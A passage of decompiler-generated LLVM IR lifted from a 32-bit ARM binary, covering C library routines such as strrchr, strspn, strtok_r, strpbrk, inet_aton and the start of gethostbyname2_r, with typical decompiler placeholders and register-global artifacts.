  br i1 %v2_2c6f8, label %dec_label_pc_2c700, label %dec_label_pc_2c718

dec_label_pc_2c700:                               ; preds = %dec_label_pc_2c6f4
  %v1_2c700 = add i32 %v0_2c700, 1
  %v0_2c704.pre = load i32, i32* @r4, align 4
  %v0_2c70c.pre = load i32, i32* @r6, align 4
  store i32 %v1_2c700, i32* @r5, align 4
  %v1_2c704 = inttoptr i32 %v0_2c704.pre to i8*
  %v2_2c704 = load i8, i8* %v1_2c704, align 1
  %v2_2c708 = icmp eq i8 %v2_2c704, 0
  store i32 %v0_2c70c.pre, i32* @r0, align 4
  %v1_2c710 = add i32 %v0_2c704.pre, 1
  store i32 %v1_2c710, i32* @r4, align 4
  br i1 %v2_2c708, label %dec_label_pc_2c718, label %dec_label_pc_2c6f4

dec_label_pc_2c718:                               ; preds = %dec_label_pc_2c700, %dec_label_pc_2c6f4, %entry
  %v0_2c718 = phi i32 [ 0, %entry ], [ %v0_2c700, %dec_label_pc_2c6f4 ], [ %v1_2c700, %dec_label_pc_2c700 ]
  %v2_2c71c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2c71c, i32* @r4, align 4
  store i32 %v6_2c6e0, i32* @r5, align 4
  store i32 %v9_2c6e0, i32* @r6, align 4
  ret i32 %v0_2c718

; uselistorder directives
  uselistorder i8 %v2_2c704, { 1, 0 }
  uselistorder i32 %v0_2c70c.pre, { 1, 0 }
  uselistorder i32 %v0_2c704.pre, { 1, 0 }
  uselistorder label %dec_label_pc_2c6f4, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_2c728 = urem i32 %arg2, 256
  store i32 %v1_2c728, i32* @r4, align 4
  %v2_2c728 = icmp eq i32 %v1_2c728, 0
  br i1 %v2_2c728, label %dec_label_pc_2c73c, label %dec_label_pc_2c750.preheader

dec_label_pc_2c750.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_2c7583 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_2c728)
  %v2_2c75c5 = icmp eq i32 %v2_2c7583, 0
  br i1 %v2_2c75c5, label %dec_label_pc_2c764, label %dec_label_pc_2c748

dec_label_pc_2c73c:                               ; preds = %entry
  %v2_2c740 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_2c768

dec_label_pc_2c748:                               ; preds = %dec_label_pc_2c750.preheader, %dec_label_pc_2c748
  %v2_2c7586 = phi i32 [ %v2_2c758, %dec_label_pc_2c748 ], [ %v2_2c7583, %dec_label_pc_2c750.preheader ]
  store i32 %v2_2c7586, i32* @r5, align 4
  %v1_2c74c = add i32 %v2_2c7586, 1
  store i32 %v1_2c74c, i32* @r0, align 4
  %v0_2c754 = load i32, i32* @r4, align 4
  %v2_2c758 = call i32 @__GI_strchr(i32 %v1_2c74c, i32 %v0_2c754)
  %v2_2c75c = icmp eq i32 %v2_2c758, 0
  br i1 %v2_2c75c, label %dec_label_pc_2c764, label %dec_label_pc_2c748

dec_label_pc_2c764:                               ; preds = %dec_label_pc_2c748, %dec_label_pc_2c750.preheader
  %v0_2c764 = load i32, i32* @r5, align 4
  br label %dec_label_pc_2c768

dec_label_pc_2c768:                               ; preds = %dec_label_pc_2c73c, %dec_label_pc_2c764
  %storemerge = phi i32 [ %v2_2c740, %dec_label_pc_2c73c ], [ %v0_2c764, %dec_label_pc_2c764 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_2c758, { 1, 0 }
  uselistorder i32 %v1_2c74c, { 1, 0 }
  uselistorder i32 %v1_2c728, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_2c768, { 1, 0 }
  uselistorder label %dec_label_pc_2c748, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_2c7a42 = load i32, i32* @r0, align 4
  %v1_2c7a43 = inttoptr i32 %v0_2c7a42 to i8*
  %v2_2c7a44 = load i8, i8* %v1_2c7a43, align 1
  %v3_2c7a45 = zext i8 %v2_2c7a44 to i32
  store i32 %v3_2c7a45, i32* @ip, align 4
  %v2_2c7a86 = icmp eq i8 %v2_2c7a44, 0
  br i1 %v2_2c7a86, label %dec_label_pc_2c7b4, label %dec_label_pc_2c788.preheader

dec_label_pc_2c780:                               ; preds = %dec_label_pc_2c788
  %v3_2c788 = zext i8 %v2_2c788 to i32
  %v1_2c790 = add i32 %v0_2c790, 1
  %v9_2c780 = icmp eq i32 %v0_2c78010, %v3_2c788
  br i1 %v9_2c780, label %dec_label_pc_2c79c, label %dec_label_pc_2c788

dec_label_pc_2c788:                               ; preds = %dec_label_pc_2c788.preheader, %dec_label_pc_2c780
  %v0_2c790 = phi i32 [ %tmp, %dec_label_pc_2c788.preheader ], [ %v1_2c790, %dec_label_pc_2c780 ]
  %v1_2c788 = inttoptr i32 %v0_2c790 to i8*
  %v2_2c788 = load i8, i8* %v1_2c788, align 1
  %v2_2c78c = icmp eq i8 %v2_2c788, 0
  br i1 %v2_2c78c, label %dec_label_pc_2c7b4, label %dec_label_pc_2c780

dec_label_pc_2c79c:                               ; preds = %dec_label_pc_2c780
  %v1_2c79c = add i32 %v0_2c79c, 1
  %v1_2c7a0 = add i32 %v0_2c7a0, 1
  %v1_2c7a4 = inttoptr i32 %v1_2c7a0 to i8*
  %v2_2c7a4 = load i8, i8* %v1_2c7a4, align 1
  %v3_2c7a4 = zext i8 %v2_2c7a4 to i32
  store i32 %v3_2c7a4, i32* @ip, align 4
  %v2_2c7a8 = icmp eq i8 %v2_2c7a4, 0
  br i1 %v2_2c7a8, label %dec_label_pc_2c7b4, label %dec_label_pc_2c788.preheader

dec_label_pc_2c788.preheader:                     ; preds = %entry, %dec_label_pc_2c79c
  %v0_2c7a0 = phi i32 [ %v1_2c7a0, %dec_label_pc_2c79c ], [ %v0_2c7a42, %entry ]
  %v0_2c79c = phi i32 [ %v1_2c79c, %dec_label_pc_2c79c ], [ 0, %entry ]
  %v0_2c78010 = phi i32 [ %v3_2c7a4, %dec_label_pc_2c79c ], [ %v3_2c7a45, %entry ]
  br label %dec_label_pc_2c788

dec_label_pc_2c7b4:                               ; preds = %dec_label_pc_2c79c, %dec_label_pc_2c788, %entry
  %v0_2c7b4 = phi i32 [ 0, %entry ], [ %v0_2c79c, %dec_label_pc_2c788 ], [ %v1_2c79c, %dec_label_pc_2c79c ]
  ret i32 %v0_2c7b4

; uselistorder directives
  uselistorder i32 %v0_2c790, { 1, 0 }
  uselistorder label %dec_label_pc_2c788.preheader, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_2c7c0 = load i32, i32* @r4, align 4
  store i32 %v3_2c7c0, i32* %stack_var_-16, align 4
  %v0_2c7c4 = load i32, i32* @r0, align 4
  store i32 %v0_2c7c4, i32* %r4.global-to-local, align 4
  %v2_2c7c4 = icmp eq i32 %v0_2c7c4, 0
  %v1_2c7c8 = load i32, i32* @r2, align 4
  br i1 %v2_2c7c4, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_2c7c8 = inttoptr i32 %v1_2c7c8 to i32*
  %v3_2c7c8 = load i32, i32* %v2_2c7c8, align 4
  store i32 %v3_2c7c8, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_2c7cc = phi i32 [ %v3_2c7c8, %bb ], [ %v0_2c7c4, %entry ]
  store i32 %v0_2c7cc, i32* @r0, align 4
  store i32 %v1_2c7c8, i32* %r5.global-to-local, align 4
  %v0_2c7d4 = load i32, i32* @r1, align 4
  store i32 %v0_2c7d4, i32* %r6.global-to-local, align 4
  %v1_2c7d8 = inttoptr i32 %v0_2c7cc to i8*
  %v2_2c7d8 = call i32 @__GI_strspn(i8* %v1_2c7d8)
  %v0_2c7dc = load i32, i32* %r4.global-to-local, align 4
  %v2_2c7dc = add i32 %v0_2c7dc, %v2_2c7d8
  %v3_2c7dc = inttoptr i32 %v2_2c7dc to i8*
  %v4_2c7dc = load i8, i8* %v3_2c7dc, align 1
  %v6_2c7dc = zext i8 %v4_2c7dc to i32
  store i32 %v6_2c7dc, i32* %r3.global-to-local, align 4
  store i32 %v2_2c7dc, i32* @r4, align 4
  %v2_2c7e4 = icmp eq i8 %v4_2c7dc, 0
  br i1 %v2_2c7e4, label %bb8, label %dec_label_pc_2c7f0

bb8:                                              ; preds = %entry._crit_edge
  %v2_2c7e8 = load i32, i32* %r5.global-to-local, align 4
  %v3_2c7e8 = inttoptr i32 %v2_2c7e8 to i32*
  store i32 %v2_2c7dc, i32* %v3_2c7e8, align 4
  br label %dec_label_pc_2c82c

dec_label_pc_2c7f0:                               ; preds = %entry._crit_edge
  %v0_2c7f0 = load i32, i32* %r6.global-to-local, align 4
  %v3_2c7f8 = call i32 @__GI_strpbrk(i8* %v3_2c7dc, i32 %v0_2c7f0)
  %v3_2c7fc = icmp eq i32 %v3_2c7f8, 0
  br i1 %v3_2c7fc, label %dec_label_pc_2c804, label %dec_label_pc_2c81c

dec_label_pc_2c804:                               ; preds = %dec_label_pc_2c7f0
  %v0_2c808 = load i32, i32* @r4, align 4
  store i32 %v0_2c808, i32* @r0, align 4
  %v2_2c80c = call i32 @rawmemchr(i32 %v0_2c808, i32 0)
  %v0_2c810 = load i32, i32* @r4, align 4
  store i32 %v0_2c810, i32* %r3.global-to-local, align 4
  %v1_2c814 = load i32, i32* %r5.global-to-local, align 4
  %v2_2c814 = inttoptr i32 %v1_2c814 to i32*
  store i32 %v2_2c80c, i32* %v2_2c814, align 4
  br label %dec_label_pc_2c82c

dec_label_pc_2c81c:                               ; preds = %dec_label_pc_2c7f0
  %v4_2c7f8 = inttoptr i32 %v3_2c7f8 to i8*
  store i8 0, i8* %v4_2c7f8, align 1
  %v7_2c820 = add i32 %v3_2c7f8, 1
  %v1_2c824 = load i32, i32* %r5.global-to-local, align 4
  %v2_2c824 = inttoptr i32 %v1_2c824 to i32*
  store i32 %v7_2c820, i32* %v2_2c824, align 4
  %v0_2c828 = load i32, i32* @r4, align 4
  store i32 %v0_2c828, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2c82c

dec_label_pc_2c82c:                               ; preds = %bb8, %dec_label_pc_2c804, %dec_label_pc_2c81c
  %v0_2c82c = load i32, i32* %r3.global-to-local, align 4
  %v2_2c830 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2c830, i32* @r4, align 4
  ret i32 %v0_2c82c

; uselistorder directives
  uselistorder i32 %v3_2c7f8, { 0, 2, 1 }
  uselistorder i32 %v0_2c7cc, { 1, 0 }
  uselistorder i32 %v0_2c7c4, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_2c82c, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2c864

dec_label_pc_2c840:                               ; preds = %dec_label_pc_2c850
  %v3_2c850 = zext i8 %v2_2c850 to i32
  %v1_2c858 = add i32 %v0_2c858, 1
  %v1_2c840 = load i32, i32* %r0.global-to-local, align 4
  %v9_2c840 = icmp eq i32 %v3_2c850, %v1_2c840
  br i1 %v9_2c840, label %dec_label_pc_2c848, label %dec_label_pc_2c850

dec_label_pc_2c848:                               ; preds = %dec_label_pc_2c840
  %v0_2c848 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_2c848, i32* %r0.global-to-local, align 4
  ret i32 %v0_2c848

dec_label_pc_2c850:                               ; preds = %dec_label_pc_2c840, %dec_label_pc_2c864
  %v0_2c858 = phi i32 [ %v1_2c858, %dec_label_pc_2c840 ], [ %arg2, %dec_label_pc_2c864 ]
  %v1_2c850 = inttoptr i32 %v0_2c858 to i8*
  %v2_2c850 = load i8, i8* %v1_2c850, align 1
  %v2_2c854 = icmp eq i8 %v2_2c850, 0
  br i1 %v2_2c854, label %dec_label_pc_2c860, label %dec_label_pc_2c840

dec_label_pc_2c860:                               ; preds = %dec_label_pc_2c850
  %v0_2c860 = load i32, i32* %r2.global-to-local, align 4
  %v1_2c860 = add i32 %v0_2c860, 1
  br label %dec_label_pc_2c864

dec_label_pc_2c864:                               ; preds = %entry, %dec_label_pc_2c860
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_2c860, %dec_label_pc_2c860 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_2c864 = inttoptr i32 %storemerge to i8*
  %v2_2c864 = load i8, i8* %v1_2c864, align 1
  %v3_2c864 = zext i8 %v2_2c864 to i32
  store i32 %v3_2c864, i32* %r0.global-to-local, align 4
  %v2_2c868 = icmp eq i8 %v2_2c864, 0
  %v0_2c86c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_2c868, i32 %v0_2c86c)
  br label %dec_label_pc_2c850

; uselistorder directives
  uselistorder i32 %v0_2c858, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_2c864, { 1, 0 }
  uselistorder label %dec_label_pc_2c850, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_2c878 = load i32, i32* @r4, align 4
  store i32 %v3_2c878, i32* %stack_var_-28, align 4
  %v0_2c880 = load i32, i32* %r0.global-to-local, align 4
  %v2_2c880 = icmp eq i32 %v0_2c880, 0
  br i1 %v2_2c880, label %dec_label_pc_2c95c, label %dec_label_pc_2c890

dec_label_pc_2c890:                               ; preds = %entry
  br label %dec_label_pc_2c8a8

dec_label_pc_2c8a8:                               ; preds = %dec_label_pc_2c890, %dec_label_pc_2c920
  %v1_2c920 = phi i32 [ 0, %dec_label_pc_2c890 ], [ %v5_2c920, %dec_label_pc_2c920 ]
  %v0_2c924 = phi i32 [ 1, %dec_label_pc_2c890 ], [ %v1_2c924, %dec_label_pc_2c920 ]
  %v0_2c8a8 = phi i32 [ %v0_2c880, %dec_label_pc_2c890 ], [ %v0_2c8a812, %dec_label_pc_2c920 ]
  %v1_2c8a8 = inttoptr i32 %v0_2c8a8 to i8*
  %v2_2c8a8 = load i8, i8* %v1_2c8a8, align 1
  %v3_2c8a8 = zext i8 %v2_2c8a8 to i32
  %v4_2c8ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 360) to i32*), align 4
  %v2_2c8b0 = mul nuw nsw i32 %v3_2c8a8, 2
  %v2_2c8b4 = add i32 %v2_2c8b0, %v4_2c8ac
  %v3_2c8b4 = inttoptr i32 %v2_2c8b4 to i16*
  %v4_2c8b4 = load i16, i16* %v3_2c8b4, align 2
  %v1_2c8b8 = and i16 %v4_2c8b4, 8
  %v2_2c8b8 = icmp eq i16 %v1_2c8b8, 0
  br i1 %v2_2c8b8, label %dec_label_pc_2c95c, label %dec_label_pc_2c8c0

dec_label_pc_2c8c0:                               ; preds = %dec_label_pc_2c8a8
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_2c8e0

dec_label_pc_2c8c8:                               ; preds = %dec_label_pc_2c8e0
  %v2_2c8c8 = mul i32 %v0_2c920, 10
  %v1_2c8cc = add i32 %v2_2c8c8, -48
  %v2_2c8d0 = add i32 %v3_2c8e0, %v1_2c8cc
  store i32 %v2_2c8d0, i32* @ip, align 4
  %v8_2c8d8 = icmp sgt i32 %v2_2c8d0, 255
  br i1 %v8_2c8d8, label %dec_label_pc_2c95c, label %dec_label_pc_2c8dc

dec_label_pc_2c8dc:                               ; preds = %dec_label_pc_2c8c8
  %v1_2c8dc = add i32 %v0_2c910, 1
  store i32 %v1_2c8dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2c8e0

dec_label_pc_2c8e0:                               ; preds = %dec_label_pc_2c8c0, %dec_label_pc_2c8dc
  %v0_2c920 = phi i32 [ 0, %dec_label_pc_2c8c0 ], [ %v2_2c8d0, %dec_label_pc_2c8dc ]
  %v0_2c910 = phi i32 [ %v0_2c8a8, %dec_label_pc_2c8c0 ], [ %v1_2c8dc, %dec_label_pc_2c8dc ]
  %v1_2c8e0 = inttoptr i32 %v0_2c910 to i8*
  %v2_2c8e0 = load i8, i8* %v1_2c8e0, align 1
  %v3_2c8e0 = zext i8 %v2_2c8e0 to i32
  %v2_2c8e4 = mul nuw nsw i32 %v3_2c8e0, 2
  %v2_2c8e8 = add i32 %v2_2c8e4, %v4_2c8ac
  %v3_2c8e8 = inttoptr i32 %v2_2c8e8 to i16*
  %v4_2c8e8 = load i16, i16* %v3_2c8e8, align 2
  %v6_2c8e8 = zext i16 %v4_2c8e8 to i32
  %v1_2c8ec = and i32 %v6_2c8e8, 8
  %v2_2c8ec = icmp eq i32 %v1_2c8ec, 0
  br i1 %v2_2c8ec, label %dec_label_pc_2c8f4, label %dec_label_pc_2c8c8

dec_label_pc_2c8f4:                               ; preds = %dec_label_pc_2c8e0
  %v7_2c8f4 = icmp eq i32 %v0_2c924, 4
  br i1 %v7_2c8f4, label %dec_label_pc_2c90c, label %dec_label_pc_2c8fc

dec_label_pc_2c8fc:                               ; preds = %dec_label_pc_2c8f4
  %v7_2c8fc = icmp eq i8 %v2_2c8e0, 46
  br i1 %v7_2c8fc, label %dec_label_pc_2c904, label %dec_label_pc_2c95c

dec_label_pc_2c904:                               ; preds = %dec_label_pc_2c8fc
  %v1_2c904 = add i32 %v0_2c910, 1
  store i32 %v1_2c904, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2c920

dec_label_pc_2c90c:                               ; preds = %dec_label_pc_2c8f4
  %v2_2c90c = icmp eq i8 %v2_2c8e0, 0
  %v1_2c910 = add i32 %v0_2c910, 1
  store i32 %v1_2c910, i32* %r0.global-to-local, align 4
  br i1 %v2_2c90c, label %dec_label_pc_2c920, label %dec_label_pc_2c918

dec_label_pc_2c918:                               ; preds = %dec_label_pc_2c90c
  %v1_2c918 = and i32 %v6_2c8e8, 32
  %v2_2c918 = icmp eq i32 %v1_2c918, 0
  br i1 %v2_2c918, label %dec_label_pc_2c95c, label %dec_label_pc_2c920

dec_label_pc_2c920:                               ; preds = %dec_label_pc_2c918, %dec_label_pc_2c90c, %dec_label_pc_2c904
  %v0_2c8a812 = phi i32 [ %v1_2c910, %dec_label_pc_2c918 ], [ %v1_2c910, %dec_label_pc_2c90c ], [ %v1_2c904, %dec_label_pc_2c904 ]
  %v4_2c920 = mul i32 %v1_2c920, 256
  %v5_2c920 = or i32 %v0_2c920, %v4_2c920
  %v1_2c924 = add nuw nsw i32 %v0_2c924, 1
  %v7_2c92c = icmp slt i32 %v1_2c924, 5
  br i1 %v7_2c92c, label %dec_label_pc_2c8a8, label %dec_label_pc_2c930

dec_label_pc_2c930:                               ; preds = %dec_label_pc_2c920
  %v2_2c930 = icmp eq i32 %arg2, 0
  br i1 %v2_2c930, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_2c930
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2c960

bb:                                               ; preds = %dec_label_pc_2c930
  %v4_2c934 = udiv i32 %v5_2c920, 16777216
  %v2_2c938 = udiv i32 %v5_2c920, 256
  %v5_2c93c = and i32 %v2_2c938, 65280
  %v2_2c940 = and i32 %v5_2c920, 65280
  %v5_2c944 = mul nuw nsw i32 %v2_2c940, 256
  %v5_2c948 = mul i32 %v0_2c920, 16777216
  %v6_2c93c = or i32 %v4_2c934, %v5_2c948
  %v6_2c944 = or i32 %v6_2c93c, %v5_2c93c
  %v6_2c948 = or i32 %v6_2c944, %v5_2c944
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_2c954 = inttoptr i32 %arg2 to i32*
  store i32 %v6_2c948, i32* %v3_2c954, align 4
  %v2_2c960.pre = load i32, i32* %stack_var_-28, align 4
  %v1_2c964.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2c960

dec_label_pc_2c95c:                               ; preds = %dec_label_pc_2c8fc, %dec_label_pc_2c918, %dec_label_pc_2c8a8, %dec_label_pc_2c8c8, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2c960

dec_label_pc_2c960:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_2c95c
  %v1_2c964 = phi i32 [ %v1_2c964.pre, %bb ], [ 0, %dec_label_pc_2c95c ], [ 1, %.thread7.thread ]
  %v2_2c960 = phi i32 [ %v2_2c960.pre, %bb ], [ %v3_2c878, %dec_label_pc_2c95c ], [ %v3_2c878, %.thread7.thread ]
  store i32 %v2_2c960, i32* @r4, align 4
  ret i32 %v1_2c964

; uselistorder directives
  uselistorder i32 %v1_2c924, { 1, 0 }
  uselistorder i32 %v5_2c920, { 2, 0, 1, 3 }
  uselistorder i32 %v0_2c910, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 7, 8, 2, 4, 5, 6, 0, 1 }
  uselistorder i32 65280, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_2c960, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2c95c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_2c8e0, { 1, 0 }
  uselistorder label %dec_label_pc_2c8a8, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp24, i32* %stack_var_0, align 4
  %v6_2c970 = load i32, i32* @r5, align 4
  %v9_2c970 = load i32, i32* @r6, align 4
  %v12_2c970 = load i32, i32* @r7, align 4
  %v15_2c970 = load i32, i32* @r8, align 4
  %v18_2c970 = load i32, i32* @sb, align 4
  %v21_2c970 = load i32, i32* @sl, align 4
  %v24_2c970 = load i32, i32* @fp, align 4
  %v0_2c974 = load i32, i32* @r1, align 4
  %v7_2c974 = icmp eq i32 %v0_2c974, 2
  store i32 %arg1, i32* @sb, align 4
  %v0_2c980 = load i32, i32* @r2, align 4
  store i32 %v0_2c980, i32* @r7, align 4
  %v0_2c984 = load i32, i32* @r3, align 4
  store i32 %v0_2c984, i32* @r8, align 4
  br i1 %v7_2c974, label %dec_label_pc_2c990, label %dec_label_pc_2c9b0

dec_label_pc_2c990:                               ; preds = %entry
  store i32 %tmp12, i32* @ip, align 4
  store i32 %v0_2c980, i32* @r1, align 4
  store i32 %v0_2c984, i32* @r2, align 4
  store i32 %tmp24, i32* @r3, align 4
  %v0_2c9a8 = call i32 @gethostbyname_r()
  store i32 %v0_2c9a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2cc24

dec_label_pc_2c9b0:                               ; preds = %entry
  store i32 0, i32* @sl, align 4
  %v7_2c9b8 = icmp eq i32 %v0_2c974, 10
  %v2_2c9bc = inttoptr i32 %tmp12 to i32*
  store i32 0, i32* %v2_2c9bc, align 4
  br i1 %v7_2c9b8, label %dec_label_pc_2c9c4, label %dec_label_pc_2cc20

dec_label_pc_2c9c4:                               ; preds = %dec_label_pc_2c9b0
  %v1_2c9c4 = load i32, i32* @sl, align 4
  %v9_2c9c4 = icmp eq i32 %v1_2c9c4, %arg1
  br i1 %v9_2c9c4, label %dec_label_pc_2cc20, label %dec_label_pc_2c9cc

dec_label_pc_2c9cc:                               ; preds = %dec_label_pc_2c9c4
  %v0_2c9d4 = call i32 @__aeabi_read_tp()
  store i32 %v0_2c9d4, i32* %r0.global-to-local, align 4
  %v3_2c9d8 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2c9d8 = sext i16 %v3_2c9d8 to i32
  store i32 %v4_2c9d8, i32* @r5, align 4
  store i32 %tmp12, i32* @lr, align 4
  %v2_2c9e8 = add i32 %v4_2c9d8, %v0_2c9d4
  %v3_2c9e8 = inttoptr i32 %v2_2c9e8 to i32*
  %v4_2c9e8 = load i32, i32* %v3_2c9e8, align 4
  store i32 %v4_2c9e8, i32* @r4, align 4
  store i32 %v0_2c9d4, i32* @r6, align 4
  %v0_2c9f0 = load i32, i32* @sl, align 4
  store i32 %v0_2c9f0, i32* %v3_2c9e8, align 4
  %v0_2c9f4 = load i32, i32* @sb, align 4
  store i32 %v0_2c9f4, i32* %r0.global-to-local, align 4
  %v1_2ca00 = call i32 @__get_hosts_byname_r(i32 %v0_2c9f4)
  store i32 %v1_2ca00, i32* %r0.global-to-local, align 4
  %v2_2ca04 = icmp eq i32 %v1_2ca00, 0
  br i1 %v2_2ca04, label %.thread1, label %dec_label_pc_2ca18

.thread1:                                         ; preds = %dec_label_pc_2c9cc
  %v4_2ca0c = load i16, i16* @global_var_42934.3040, align 2
  %v5_2ca0c = sext i16 %v4_2ca0c to i32
  store i32 %v5_2ca0c, i32* %r3.global-to-local, align 4
  %v1_2ca10 = load i32, i32* @r4, align 4
  %v2_2ca10 = load i32, i32* @r6, align 4
  %v4_2ca10 = add i32 %v2_2ca10, %v5_2ca0c
  %v5_2ca10 = inttoptr i32 %v4_2ca10 to i32*
  store i32 %v1_2ca10, i32* %v5_2ca10, align 4
  br label %dec_label_pc_2cc24

dec_label_pc_2ca18:                               ; preds = %dec_label_pc_2c9cc
  %v0_2ca18 = load i32, i32* @fp, align 4
  %v1_2ca18 = inttoptr i32 %v0_2ca18 to i32*
  %v2_2ca18 = load i32, i32* %v1_2ca18, align 4
  store i32 %v2_2ca18, i32* %r3.global-to-local, align 4
  %v7_2ca1c = icmp eq i32 %v2_2ca18, 1
  br i1 %v7_2ca1c, label %dec_label_pc_2ca38, label %dec_label_pc_2ca24

dec_label_pc_2ca24:                               ; preds = %dec_label_pc_2ca18
  %v7_2ca24 = icmp eq i32 %v2_2ca18, 4
  br i1 %v7_2ca24, label %dec_label_pc_2ca5c, label %dec_label_pc_2ca2c

dec_label_pc_2ca2c:                               ; preds = %dec_label_pc_2ca24
  %v3_2ca2c = icmp eq i32 %v2_2ca18, -1
  br i1 %v3_2ca2c, label %dec_label_pc_2ca48, label %dec_label_pc_2cc24

dec_label_pc_2ca38:                               ; preds = %dec_label_pc_2ca18
  %v7_2ca38 = icmp eq i32 %v1_2ca00, 2
  br i1 %v7_2ca38, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_2ca38
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_2ca60

.thread3:                                         ; preds = %dec_label_pc_2ca38
  store i32 1, i32* @r6, align 4
  br label %dec_label_pc_2ca60

dec_label_pc_2ca48:                               ; preds = %dec_label_pc_2ca2c
  %v3_2ca4c = load i16, i16* @global_var_42934.3040, align 2
  %v4_2ca4c = sext i16 %v3_2ca4c to i32
  store i32 %v4_2ca4c, i32* %r3.global-to-local, align 4
  %v0_2ca50 = load i32, i32* @r6, align 4
  %v2_2ca50 = add i32 %v0_2ca50, %v4_2ca4c
  %v3_2ca50 = inttoptr i32 %v2_2ca50 to i32*
  %v4_2ca50 = load i32, i32* %v3_2ca50, align 4
  store i32 %v4_2ca50, i32* %r3.global-to-local, align 4
  %v7_2ca54 = icmp eq i32 %v4_2ca50, 2
  br i1 %v7_2ca54, label %dec_label_pc_2ca5c, label %dec_label_pc_2cc24

dec_label_pc_2ca5c:                               ; preds = %dec_label_pc_2ca48, %dec_label_pc_2ca24
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_2ca60

dec_label_pc_2ca60:                               ; preds = %bb, %.thread3, %dec_label_pc_2ca5c
  %v3_2ca60 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_2ca60, i32* %r0.global-to-local, align 4
  %v0_2ca64 = load i32, i32* @r8, align 4
  %v1_2ca64 = sub i32 0, %v0_2ca64
  %v1_2ca68 = urem i32 %v1_2ca64, 4
  store i32 %v1_2ca68, i32* %r1.global-to-local, align 4
  %v2_2ca70 = sub i32 %v3_2ca60, %v1_2ca68
  store i32 %v2_2ca70, i32* %r2.global-to-local, align 4
  %v3_2ca74 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2ca74 = sext i16 %v3_2ca74 to i32
  store i32 %v4_2ca74, i32* %r3.global-to-local, align 4
  %v0_2ca78 = call i32 @__aeabi_read_tp()
  store i32 %v0_2ca78, i32* %r0.global-to-local, align 4
  %v1_2ca7c = add i32 %v2_2ca70, -24
  store i32 %v1_2ca7c, i32* @sl, align 4
  %v0_2ca80 = load i32, i32* @r4, align 4
  %v3_2ca80 = add i32 %v4_2ca74, %v0_2ca78
